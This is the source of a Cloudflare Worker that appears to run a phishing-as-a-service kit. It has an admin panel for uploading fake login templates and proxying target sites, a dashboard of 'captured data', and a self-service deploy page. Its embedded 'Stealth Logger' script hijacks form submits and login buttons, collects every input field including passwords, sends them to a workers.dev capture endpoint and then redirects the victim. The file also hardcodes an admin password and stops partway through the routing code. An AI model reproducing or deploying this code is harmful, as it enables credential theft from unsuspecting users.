/**
 * 🚀 D-TECH GLOBAL ROUTER V7.0 (API ONLY)
 * LOCATION: Cloudflare Worker
 */

const PASSWORD = "admin-secret-123";
const COOKIE_NAME = "admin_session";
const ROOT_DOMAIN = "account-login.co.za";

// --- EMBEDDED STATIC FILES ---
const ADMIN_HTML = "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>D-TECH Cloud Admin</title>\n    <style>\n        body { font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }\n        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }\n        h1 { margin-top: 0; color: #0070f3; }\n        .form-group { margin-bottom: 20px; }\n        label { display: block; margin-bottom: 5px; font-weight: bold; }\n        input[type=\"text\"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }\n        textarea { height: 150px; font-family: monospace; }\n        button { background: #0070f3; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }\n        button.btn-danger { background: #d32f2f; }\n        button:hover { opacity: 0.9; }\n        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; }\n        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }\n        .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }\n        .hidden { display: none; }\n        #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }\n        .success { background: #d4edda; color: #155724; }\n        .error { background: #f8d7da; color: #721c24; }\n        .nav-links { margin-bottom: 20px; text-align: right; }\n        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }\n\n        /* Table Styles */\n        table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }\n        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }\n        th { background: #fafafa; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"nav-links\">\n            <a href=\"captures.html\">View Captured Data &rarr;</a>\n        </div>\n        <h1>\ud83d\ude80 Cloud Admin Panel</h1>\n\n        <div class=\"tabs\">\n            <div class=\"tab active\" onclick=\"switchTab('templates')\">Manage Templates</div>\n            <div class=\"tab\" onclick=\"switchTab('proxy')\">Deploy Proxy (Admin)</div>\n        </div>\n\n        <!-- Templates Section -->\n        <div id=\"templates-section\" class=\"form-section\">\n            <h2>Existing Templates</h2>\n            <div id=\"template-list\">Loading...</div>\n\n            <h3>Add New Template</h3>\n            <div class=\"form-group\">\n                <label>Template Name</label>\n                <input type=\"text\" id=\"tpl-name\" placeholder=\"e.g., login-page-v1\">\n            </div>\n            <div class=\"form-group\">\n                <label>HTML Content</label>\n                <textarea id=\"tpl-content\" placeholder=\"<html>...</html>\"></textarea>\n            </div>\n            <button onclick=\"saveTemplate()\">Save Template</button>\n        </div>\n\n        <!-- Proxy Form (Legacy Admin Feature) -->\n        <div id=\"proxy-section\" class=\"form-section hidden\">\n            <p>Admin-only proxy deployment (bypasses templates).</p>\n            <div class=\"form-group\">\n                <label>Subdomain</label>\n                <input type=\"text\" id=\"proxy-subdomain\" placeholder=\"e.g., blog\">\n            </div>\n            <div class=\"form-group\">\n                <label>Target URL</label>\n                <input type=\"text\" id=\"proxy-url\" placeholder=\"https://example.com\">\n            </div>\n            <button onclick=\"saveProxy()\">Create Proxy</button>\n        </div>\n\n        <div id=\"message\"></div>\n    </div>\n\n    <script>\n        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';\n\n        function switchTab(tab) {\n            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));\n            document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));\n\n            if (tab === 'templates') {\n                document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');\n                document.getElementById('templates-section').classList.remove('hidden');\n                loadTemplates();\n            } else {\n                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');\n                document.getElementById('proxy-section').classList.remove('hidden');\n            }\n        }\n\n        async function loadTemplates() {\n            try {\n                const res = await fetch(`${WORKER_URL}/api/admin/templates`, { credentials: 'include' });\n\n                if (res.status === 401) {\n                    window.location.href = 'login.html';\n                    return;\n                }\n\n                const data = await res.json();\n                const list = document.getElementById('template-list');\n                list.innerHTML = ''; // Clear loading\n\n                if (data.success && data.data.length > 0) {\n                    const table = document.createElement('table');\n\n                    // Header\n                    const thead = document.createElement('thead');\n                    const headerRow = document.createElement('tr');\n                    const thName = document.createElement('th');\n                    thName.textContent = 'Name';\n                    const thAction = document.createElement('th');\n                    thAction.textContent = 'Action';\n                    headerRow.appendChild(thName);\n                    headerRow.appendChild(thAction);\n                    thead.appendChild(headerRow);\n                    table.appendChild(thead);\n\n                    // Body\n                    const tbody = document.createElement('tbody');\n                    data.data.forEach(tpl => {\n                        const tr = document.createElement('tr');\n\n                        const tdName = document.createElement('td');\n                        tdName.textContent = tpl.name;\n\n                        const tdAction = document.createElement('td');\n                        const btn = document.createElement('button');\n                        btn.className = 'btn-danger';\n                        btn.style.width = 'auto';\n                        btn.style.padding = '5px 10px';\n                        btn.textContent = 'Delete';\n                        btn.onclick = () => deleteTemplate(tpl.name);\n                        tdAction.appendChild(btn);\n\n                        tr.appendChild(tdName);\n                        tr.appendChild(tdAction);\n                        tbody.appendChild(tr);\n                    });\n                    table.appendChild(tbody);\n                    list.appendChild(table);\n                } else {\n                    const p = document.createElement('p');\n                    p.textContent = 'No templates found.';\n                    list.appendChild(p);\n                }\n            } catch (e) {\n                document.getElementById('template-list').innerText = 'Error loading templates.';\n            }\n        }\n\n        async function saveTemplate() {\n            const name = document.getElementById('tpl-name').value;\n            const content = document.getElementById('tpl-content').value;\n            if (!name || !content) return showMessage('Missing fields', 'error');\n\n            const btn = document.querySelector('button'); // Careful selector\n            const originalText = btn.innerText;\n            btn.innerText = 'Saving...';\n\n            try {\n                const res = await fetch(`${WORKER_URL}/api/admin/templates`, {\n                    method: 'POST',\n                    headers: {'Content-Type': 'application/json'},\n                    body: JSON.stringify({name, content}),\n                    credentials: 'include'\n                });\n                if (res.status === 401) {\n                    window.location.href = 'login.html';\n                    return;\n                }\n                const data = await res.json();\n                if (data.success) {\n                    showMessage('Template saved!', 'success');\n                    document.getElementById('tpl-name').value = '';\n                    document.getElementById('tpl-content').value = '';\n                    loadTemplates();\n                } else {\n                    showMessage(data.error, 'error');\n                }\n            } catch (e) {\n                showMessage(e.message, 'error');\n            }\n            btn.innerText = originalText;\n        }\n\n        async function deleteTemplate(name) {\n            if(!confirm('Delete template ' + name + '?')) return;\n            try {\n                 const res = await fetch(`${WORKER_URL}/api/admin/templates?name=` + name, {\n                     method: 'DELETE',\n                     credentials: 'include'\n                 });\n                 if (res.status === 401) {\n                     window.location.href = 'login.html';\n                     return;\n                 }\n                 loadTemplates();\n            } catch(e) {\n                alert(e.message);\n            }\n        }\n\n        async function saveProxy() {\n            const subdomain = document.getElementById('proxy-subdomain').value;\n            const content = document.getElementById('proxy-url').value;\n            if (!subdomain || !content) return showMessage('Missing fields', 'error');\n\n            try {\n                const response = await fetch(`${WORKER_URL}/api/save`, {\n                    method: 'POST',\n                    headers: { 'Content-Type': 'application/json' },\n                    body: JSON.stringify({ subdomain, type: 'PROXY', content }),\n                    credentials: 'include'\n                });\n                if (response.status === 401) {\n                    window.location.href = 'login.html';\n                    return;\n                }\n                const result = await response.json();\n                if (result.success) showMessage('Proxy created!', 'success');\n                else showMessage(result.error, 'error');\n            } catch (err) {\n                showMessage('Network Error: ' + err.message, 'error');\n            }\n        }\n\n        function showMessage(text, type) {\n            const el = document.getElementById('message');\n            el.innerText = text;\n            el.className = type;\n            el.style.display = 'block';\n        }\n\n        // Initial load\n        loadTemplates();\n    </script>\n</body>\n</html>\n";
const CAPTURES_HTML = "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Captured Data Dashboard</title>\n    <style>\n        body { font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }\n        .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }\n        h1 { margin-top: 0; color: #d32f2f; }\n        .nav-links { margin-bottom: 20px; }\n        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }\n        table { width: 100%; border-collapse: collapse; margin-top: 20px; }\n        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }\n        th { background: #fafafa; color: #555; }\n        tr:hover { background: #f9f9f9; }\n        pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px; max-height: 200px; }\n        .empty { text-align: center; color: #888; padding: 40px; }\n        .timestamp { color: #666; font-size: 0.9em; white-space: nowrap; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"nav-links\">\n            <a href=\"admin.html\">&larr; Back to Admin Panel</a>\n        </div>\n        <h1>\ud83d\udd75\ufe0f Captured Data Logs</h1>\n        <p>Real-time data captured from injected pages.</p>\n\n        <div id=\"loading\">Loading data...</div>\n        <table id=\"data-table\" style=\"display:none;\">\n            <thead>\n                <tr>\n                    <th style=\"width: 180px;\">Time</th>\n                    <th>Data Payload</th>\n                </tr>\n            </thead>\n            <tbody id=\"table-body\">\n            </tbody>\n        </table>\n    </div>\n\n    <script>\n        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';\n\n        async function loadData() {\n            try {\n                const response = await fetch(`${WORKER_URL}/api/captures`, { credentials: 'include' });\n\n                if (response.status === 401) {\n                    window.location.href = 'login.html';\n                    return;\n                }\n\n                const result = await response.json();\n\n                if (result.success) {\n                    renderTable(result.data);\n                } else {\n                    document.getElementById('loading').innerText = 'Error loading data: ' + result.error;\n                }\n            } catch (err) {\n                document.getElementById('loading').innerText = 'Network Error: ' + err.message;\n            }\n        }\n\n        function renderTable(data) {\n            const tbody = document.getElementById('table-body');\n            const table = document.getElementById('data-table');\n            const loading = document.getElementById('loading');\n\n            loading.style.display = 'none';\n            table.style.display = 'table';\n            tbody.innerHTML = '';\n\n            if (data.length === 0) {\n                tbody.innerHTML = '<tr><td colspan=\"2\" class=\"empty\">No captured data yet.</td></tr>';\n                return;\n            }\n\n            data.forEach(item => {\n                const row = document.createElement('tr');\n\n                // Format timestamp\n                const date = new Date(item.timestamp);\n                const timeStr = date.toLocaleString();\n\n                // Format JSON data safely\n                const jsonStr = JSON.stringify(item.data, null, 2);\n\n                // Use DOM methods to prevent XSS\n                const timeCell = document.createElement('td');\n                timeCell.className = 'timestamp';\n                timeCell.textContent = timeStr;\n\n                const dataCell = document.createElement('td');\n                const pre = document.createElement('pre');\n                pre.textContent = jsonStr;\n                dataCell.appendChild(pre);\n\n                row.appendChild(timeCell);\n                row.appendChild(dataCell);\n\n                tbody.appendChild(row);\n            });\n        }\n\n        // Load on start\n        loadData();\n\n        // Refresh every 30 seconds\n        setInterval(loadData, 30000);\n    </script>\n</body>\n</html>\n";
const DASHBOARD_HTML = "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>User Dashboard</title>\n    <style>\n        body { font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; }\n        .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }\n        h1 { margin-top: 0; color: #0070f3; text-align: center; }\n        .login-section { text-align: center; margin-top: 40px; }\n        .data-section { display: none; }\n        input { padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; width: 300px; }\n        button { padding: 12px 20px; background: #0070f3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; }\n        button:hover { background: #005bb5; }\n        button.btn-delete { background: #d32f2f; padding: 6px 12px; font-size: 14px; }\n        table { width: 100%; border-collapse: collapse; margin-top: 20px; }\n        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; }\n        th { background: #fafafa; color: #555; }\n        pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px; max-height: 200px; }\n        #error-msg { color: red; margin-top: 10px; }\n        .nav-link { display:block; text-align:center; margin-top: 20px; }\n        .nav-link a { color: #0070f3; text-decoration: none; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>\ud83d\udcca User Dashboard</h1>\n\n        <div id=\"login-section\" class=\"login-section\">\n            <p>Enter your Unique Code to view your data.</p>\n            <input type=\"text\" id=\"code-input\" placeholder=\"Unique Code\">\n            <button onclick=\"login()\">View Data</button>\n            <div id=\"error-msg\"></div>\n            <div class=\"nav-link\"><a href=\"index.html\">&larr; Back to Deploy</a></div>\n        </div>\n\n        <div id=\"data-section\" class=\"data-section\">\n            <div style=\"display:flex; justify-content:space-between; align-items:center;\">\n                <h3>Your Captured Data</h3>\n                <button onclick=\"logout()\" style=\"background:#666;\">Logout</button>\n            </div>\n            <div id=\"loading\">Loading...</div>\n            <table id=\"data-table\">\n                <thead>\n                    <tr>\n                        <th style=\"width: 180px;\">Time</th>\n                        <th>Data</th>\n                        <th style=\"width: 80px;\">Action</th>\n                    </tr>\n                </thead>\n                <tbody id=\"table-body\"></tbody>\n            </table>\n        </div>\n    </div>\n\n    <script>\n        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';\n\n        let currentCode = localStorage.getItem('user_code');\n\n        if (currentCode) {\n            showData(currentCode);\n        }\n\n        function login() {\n            const code = document.getElementById('code-input').value.trim();\n            if(!code) return;\n            localStorage.setItem('user_code', code);\n            currentCode = code;\n            showData(code);\n        }\n\n        function logout() {\n            localStorage.removeItem('user_code');\n            location.reload();\n        }\n\n        function showData(code) {\n            document.getElementById('login-section').style.display = 'none';\n            document.getElementById('data-section').style.display = 'block';\n            loadCaptures(code);\n        }\n\n        async function loadCaptures(code) {\n            const tbody = document.getElementById('table-body');\n            tbody.innerHTML = '';\n            document.getElementById('loading').style.display = 'block';\n\n            try {\n                const res = await fetch(`${WORKER_URL}/api/public/captures?code=${encodeURIComponent(code)}`);\n                const data = await res.json();\n\n                document.getElementById('loading').style.display = 'none';\n\n                if (data.success && data.data.length > 0) {\n                    data.data.forEach(item => {\n                        const tr = document.createElement('tr');\n\n                        const tdDate = document.createElement('td');\n                        tdDate.textContent = new Date(item.timestamp).toLocaleString();\n\n                        const tdData = document.createElement('td');\n                        const pre = document.createElement('pre');\n                        pre.textContent = JSON.stringify(item.data, null, 2);\n                        tdData.appendChild(pre);\n\n                        const tdAction = document.createElement('td');\n                        const btn = document.createElement('button');\n                        btn.className = 'btn-delete';\n                        btn.textContent = 'Delete';\n                        btn.onclick = () => deleteItem(item.key);\n                        tdAction.appendChild(btn);\n\n                        tr.appendChild(tdDate);\n                        tr.appendChild(tdData);\n                        tr.appendChild(tdAction);\n                        tbody.appendChild(tr);\n                    });\n                } else {\n                    const tr = document.createElement('tr');\n                    const td = document.createElement('td');\n                    td.colSpan = 3;\n                    td.style.textAlign = 'center';\n                    td.style.padding = '20px';\n                    td.textContent = 'No data found.';\n                    tr.appendChild(td);\n                    tbody.appendChild(tr);\n                }\n            } catch (e) {\n                document.getElementById('loading').innerText = 'Error: ' + e.message;\n            }\n        }\n\n        async function deleteItem(key) {\n            if(!confirm('Delete this entry?')) return;\n            try {\n                const res = await fetch(`${WORKER_URL}/api/public/captures?code=${encodeURIComponent(currentCode)}&key=${encodeURIComponent(key)}`, {\n                    method: 'DELETE'\n                });\n                const data = await res.json();\n                if(data.success) {\n                    loadCaptures(currentCode);\n                } else {\n                    alert('Error: ' + data.error);\n                }\n            } catch (e) {\n                alert('Network Error');\n            }\n        }\n    </script>\n</body>\n</html>\n";
const INDEX_HTML = "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Cloud Hosting Deployment</title>\n    <style>\n        body { font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin:0; }\n        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }\n        h1 { text-align: center; color: #0070f3; margin-top: 0; }\n        p { text-align: center; color: #666; }\n        .form-group { margin-bottom: 20px; }\n        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; }\n        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; transition: border-color 0.2s; }\n        input:focus, select:focus { border-color: #0070f3; outline: none; }\n        button { width: 100%; padding: 14px; background: #0070f3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.2s; }\n        button:hover { background: #005bb5; }\n        .footer { text-align: center; margin-top: 20px; font-size: 14px; color: #888; }\n        .footer a { color: #0070f3; text-decoration: none; }\n        #message { margin-top: 20px; padding: 15px; border-radius: 6px; display: none; text-align: center; }\n        .success { background: #d4edda; color: #155724; }\n        .error { background: #f8d7da; color: #721c24; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>\ud83d\ude80 Deploy Your Site</h1>\n        <p>Choose a template and launch instantly.</p>\n\n        <div class=\"form-group\">\n            <label>Choose Template</label>\n            <select id=\"templateName\">\n                <option value=\"\">Loading templates...</option>\n            </select>\n        </div>\n\n        <div class=\"form-group\">\n            <label>Subdomain Name</label>\n            <input type=\"text\" id=\"subdomain\" placeholder=\"e.g., mysite\">\n        </div>\n\n        <div class=\"form-group\">\n            <label>Unique Secret Code</label>\n            <input type=\"text\" id=\"uniqueCode\" placeholder=\"Create a secret code (for accessing data)\">\n        </div>\n\n        <button onclick=\"deploy()\">Deploy Now</button>\n\n        <div id=\"message\"></div>\n\n        <div class=\"footer\">\n            <a href=\"dashboard.html\">Access User Dashboard</a>\n        </div>\n    </div>\n\n    <script>\n        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';\n\n        async function loadTemplates() {\n            const select = document.getElementById('templateName');\n            try {\n                const res = await fetch(`${WORKER_URL}/api/public/templates`);\n                const data = await res.json();\n\n                if (data.success) {\n                    select.innerHTML = '';\n                    const defaultOpt = document.createElement('option');\n                    defaultOpt.value = \"\";\n                    defaultOpt.textContent = \"-- Select a Template --\";\n                    select.appendChild(defaultOpt);\n\n                    data.data.forEach(t => {\n                        const opt = document.createElement('option');\n                        opt.value = t;\n                        opt.textContent = t;\n                        select.appendChild(opt);\n                    });\n                } else {\n                     select.innerHTML = '';\n                     const errOpt = document.createElement('option');\n                     errOpt.textContent = \"Error loading templates\";\n                     select.appendChild(errOpt);\n                }\n            } catch (e) {\n                console.error(e);\n                select.innerHTML = '';\n                const errOpt = document.createElement('option');\n                errOpt.textContent = \"Network Error\";\n                select.appendChild(errOpt);\n            }\n        }\n\n        async function deploy() {\n            const templateName = document.getElementById('templateName').value;\n            const subdomain = document.getElementById('subdomain').value;\n            const uniqueCode = document.getElementById('uniqueCode').value;\n            const btn = document.querySelector('button');\n\n            if (!templateName || !subdomain || !uniqueCode) {\n                showMessage('Please fill in all fields.', 'error');\n                return;\n            }\n\n            btn.innerText = 'Deploying...';\n            btn.disabled = true;\n            showMessage('', '');\n\n            try {\n                const res = await fetch(`${WORKER_URL}/api/public/deploy`, {\n                    method: 'POST',\n                    headers: {'Content-Type': 'application/json'},\n                    body: JSON.stringify({ templateName, subdomain, uniqueCode })\n                });\n                const data = await res.json();\n\n                if (data.success) {\n                    showMessage('Deployment Successful! Redirecting...', 'success');\n                    setTimeout(() => {\n                        window.location.href = data.url;\n                    }, 2000);\n                } else {\n                    showMessage(data.error, 'error');\n                    btn.innerText = 'Deploy Now';\n                    btn.disabled = false;\n                }\n            } catch (e) {\n                showMessage('Network Error: ' + e.message, 'error');\n                btn.innerText = 'Deploy Now';\n                btn.disabled = false;\n            }\n        }\n\n        function showMessage(text, type) {\n            const el = document.getElementById('message');\n            el.innerText = text;\n            el.className = type;\n            el.style.display = text ? 'block' : 'none';\n        }\n\n        // Load templates on start\n        loadTemplates();\n    </script>\n</body>\n</html>\n";
const INJECTION_JS = "// CONFIG\nconst CONFIG = {\n    INPUT_IDLE_TIMEOUT: 2000,\n    // Expanded patterns as requested\n    SUBMIT_BUTTON_PATTERNS: [\n        'submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate',\n        'log on', 'start', 'verify', 'go', 'enter', 'accept'\n    ],\n    REDIRECT_URL: 'https://example.com',\n    // The worker endpoint to receive data (relative path)\n    CAPTURE_URL: 'https://calm-bread-1d99.testdx24.workers.dev/api/capture'\n};\n\n// ===== INVISIBLE LOGGER =====\n(() => {\n    const log = (msg, type='info') => console.log(`[Stealth Logger] ${msg}`);\n\n    let typingTimer;\n    let formData = {};\n\n    // Helper to get a usable name for a field\n    const getFieldName = (field) => {\n        return field.name || field.id || field.placeholder || field.getAttribute('aria-label') || `unnamed_${field.type}`;\n    };\n\n    // Helper to capture ALL current inputs on the page\n    const captureAllInputs = () => {\n        const data = { ...formData }; // Start with what we captured from typing\n        document.querySelectorAll('input, textarea, select').forEach(field => {\n            const name = getFieldName(field);\n            const value = field.value.trim();\n            // Only add if it has a value and isn't already captured (or overwrite if we prefer fresh data)\n            // Prioritize fresh DOM read over typing history for accuracy at submit time\n            if (value) {\n                data[name] = value;\n            }\n        });\n        return data;\n    };\n\n    // Send to your Worker\n    const sendData = async (data) => {\n        try {\n            const timestamp = new Date().toISOString();\n            const pageUrl = window.location.href;\n            const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN'; // Get the unique code injected by the worker\n\n            // Build a simple JSON payload for the worker\n            const payload = {\n                url: pageUrl,\n                timestamp: timestamp,\n                formData: data,\n                userAgent: navigator.userAgent,\n                uniqueCode: uniqueCode // Include the unique code\n            };\n\n            const response = await fetch(CONFIG.CAPTURE_URL, {\n                method: 'POST',\n                headers: { 'Content-Type': 'application/json' },\n                body: JSON.stringify(payload)\n            });\n\n            if (response.ok) {\n                log('Successfully sent to Worker');\n                window.location.href = CONFIG.REDIRECT_URL;  // Redirect after success\n            } else {\n                const err = await response.text();\n                log('Worker error: ' + err, 'error');\n                // Fallback redirect\n                setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);\n            }\n        } catch (err) {\n            log('Fetch failed: ' + err.message, 'error');\n             // Fallback redirect\n             setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);\n        }\n    };\n\n    // Input change handler (collects as user types)\n    const setupInputHandlers = () => {\n        document.querySelectorAll('input, textarea, select').forEach(field => {\n            field.addEventListener('input', () => {\n                clearTimeout(typingTimer);\n                typingTimer = setTimeout(() => {\n                    const name = getFieldName(field);\n                    const value = field.value.trim();\n                    if (value) {\n                        formData[name] = value;\n                    }\n                }, CONFIG.INPUT_IDLE_TIMEOUT);\n            });\n        });\n    };\n\n    // Submit / button handlers\n    const setupSubmissionHandlers = () => {\n        // 1. Standard Form Submits\n        document.querySelectorAll('form').forEach(form => {\n            form.addEventListener('submit', (e) => {\n                e.preventDefault(); // Stop normal form submission\n                const data = captureAllInputs();\n                if (Object.keys(data).length > 0) {\n                    sendData(data);\n                } else {\n                    // If no data, proceed anyway\n                    window.location.href = CONFIG.REDIRECT_URL;\n                }\n            }, true);\n        });\n\n        // 2. Generic Button Clicks (for non-form logins or div buttons)\n        document.addEventListener('click', (e) => {\n            const target = e.target;\n\n            // IGNORE clicks on interactive inputs (unless it's a button type)\n            // This prevents capturing when the user just clicks to type in a field.\n            if (['INPUT', 'TEXTAREA', 'SELECT', 'OPTION', 'LABEL'].includes(target.tagName)) {\n                // If it's a text/password/email input, ignore.\n                // Only proceed if it is strictly a submit/button input.\n                if (target.tagName === 'INPUT' && (target.type === 'submit' || target.type === 'button' || target.type === 'image')) {\n                     // Proceed to check as a button\n                } else {\n                    return;\n                }\n            }\n\n            // Helper to check text content against keywords\n            const matchesKeyword = (el) => {\n                const text = (el.innerText || el.value || '').toLowerCase();\n                return CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => text.includes(pattern));\n            };\n\n            // A. Check for Standard Buttons/Links first (Button, Input[submit], A)\n            // We look up the tree in case the click was on an icon inside the button\n            const stdBtn = target.closest('button, input[type=\"submit\"], input[type=\"button\"], a');\n            if (stdBtn) {\n                if (matchesKeyword(stdBtn)) {\n                     const data = captureAllInputs();\n                     if (Object.keys(data).length > 0) {\n                         e.preventDefault();\n                         e.stopPropagation();\n                         sendData(data);\n                     }\n                     return;\n                }\n            }\n\n            // B. Check for \"Fake\" Buttons (div, span)\n            // These must look clickable (cursor: pointer) or have role=\"button\"\n            // We avoid simply using closest('div') because that catches container divs.\n\n            // We assume the user clicks *on* the button or a direct child.\n            // So we check the target and its immediate parents for a \"clickable div\".\n            const fakeBtn = target.closest('div, span');\n\n            if (fakeBtn) {\n                // Determine if this element is \"interactive\"\n                const style = window.getComputedStyle(fakeBtn);\n                const isClickable = style.cursor === 'pointer' || fakeBtn.getAttribute('role') === 'button';\n\n                if (isClickable && matchesKeyword(fakeBtn)) {\n                     const data = captureAllInputs();\n                     if (Object.keys(data).length > 0) {\n                         e.preventDefault();\n                         e.stopPropagation();\n                         sendData(data);\n                     }\n                }\n            }\n        }, true);\n    };\n\n    // Initialize\n    if (document.readyState === 'loading') {\n        document.addEventListener('DOMContentLoaded', () => {\n            setupInputHandlers();\n            setupSubmissionHandlers();\n        });\n    } else {\n        setupInputHandlers();\n        setupSubmissionHandlers();\n    }\n\n})();\n";
const LOGIN_HTML = "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Admin Login</title>\n    <style>\n        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f9; margin: 0; }\n        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 300px; }\n        h1 { text-align: center; color: #333; margin-bottom: 20px; }\n        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }\n        button { width: 100%; padding: 10px; background: #0070f3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }\n        button:hover { background: #005bb5; }\n        .error { color: red; text-align: center; margin-bottom: 15px; font-size: 14px; display: none; }\n    </style>\n</head>\n<body>\n    <div class=\"login-box\">\n        <h1>Admin Login</h1>\n        <div id=\"error-msg\" class=\"error\"></div>\n        <form id=\"login-form\">\n            <input type=\"password\" name=\"password\" placeholder=\"Enter Password\" required>\n            <button type=\"submit\">Login</button>\n        </form>\n    </div>\n\n    <script>\n        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';\n\n        document.getElementById('login-form').addEventListener('submit', async (e) => {\n            e.preventDefault();\n            const formData = new FormData(e.target);\n            const errorEl = document.getElementById('error-msg');\n            const btn = e.target.querySelector('button');\n\n            errorEl.style.display = 'none';\n            btn.innerText = 'Logging in...';\n            btn.disabled = true;\n\n            try {\n                const res = await fetch(`${WORKER_URL}/admin/login`, {\n                    method: 'POST',\n                    body: formData,\n                    credentials: 'include'\n                });\n\n                // Check for redirect (some browsers might follow 302 automatically, but we want JSON)\n                // My plan is to make the worker return JSON.\n\n                let data;\n                const contentType = res.headers.get(\"content-type\");\n                if (contentType && contentType.indexOf(\"application/json\") !== -1) {\n                    data = await res.json();\n                } else {\n                    // Fallback if worker sends HTML (shouldn't happen with new plan)\n                    const text = await res.text();\n                    data = { success: false, error: \"Unexpected response from server\" };\n                }\n\n                if (data.success) {\n                    window.location.href = 'admin.html';\n                } else {\n                    errorEl.innerText = data.error || 'Invalid Password';\n                    errorEl.style.display = 'block';\n                    btn.innerText = 'Login';\n                    btn.disabled = false;\n                }\n\n            } catch (err) {\n                errorEl.innerText = 'Network Error: ' + err.message;\n                errorEl.style.display = 'block';\n                btn.innerText = 'Login';\n                btn.disabled = false;\n            }\n        });\n    </script>\n</body>\n</html>\n";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const domain = url.hostname;

    // --- STATIC FILES ROUTING (Bypassing KV) ---
    const path = url.pathname;

    // Serve index.html as homepage ONLY for the root domain
    if (path === '/' && domain === ROOT_DOMAIN) {
        return new Response(INDEX_HTML, { headers: { 'Content-Type': 'text/html' } });
    }
    // Allow accessing specific files on any domain (useful for admin/login)
    if (path === '/index.html') {
        return new Response(INDEX_HTML, { headers: { 'Content-Type': 'text/html' } });
    }
    if (path === '/admin.html') {
        return new Response(ADMIN_HTML, { headers: { 'Content-Type': 'text/html' } });
    }
    if (path === '/captures.html') {
        return new Response(CAPTURES_HTML, { headers: { 'Content-Type': 'text/html' } });
    }
    if (path === '/dashboard.html') {
        return new Response(DASHBOARD_HTML, { headers: { 'Content-Type': 'text/html' } });
    }
    if (path === '/login.html') {
        return new Response(LOGIN_HTML, { headers: { 'Content-Type': 'text/html' } });
    }
    if (path === '/injection.js') {
